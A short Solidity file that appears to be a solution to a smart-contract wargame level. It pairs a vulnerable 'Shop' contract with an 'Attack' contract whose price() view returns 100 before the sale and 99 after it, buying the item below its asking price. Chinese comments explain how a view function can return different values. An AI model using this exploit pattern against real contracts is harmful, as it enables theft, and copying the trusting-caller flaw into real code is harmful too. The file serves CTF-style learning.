// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface Buyer {
  function price() external view returns (uint);
}

contract Shop {
  uint public price = 100;
  bool public isSold;

  function buy() public {
    Buyer _buyer = Buyer(msg.sender);

    if (_buyer.price() >= price && !isSold) {
      isSold = true;
      price = _buyer.price();
    }
  }
}

//怎样能够使得view方法两次返回的值不同
//1.依托于外部合约的变化，2.依托于本身变量的变化/如果view类型方法依托于外部合约的状态，通过询问外部变量，即可无修改地实现返回值的区别

contract Attack {
  
  Shop shop;
   function att()public{
     shop=Shop(0xB5f05481DAdb5044C0cCCEc95dABB07577e3665C);
     shop.buy();
   }
   function price()external view returns (uint){
     if(shop.isSold()==false){
       return 100;
     }
     return 99;
   }
}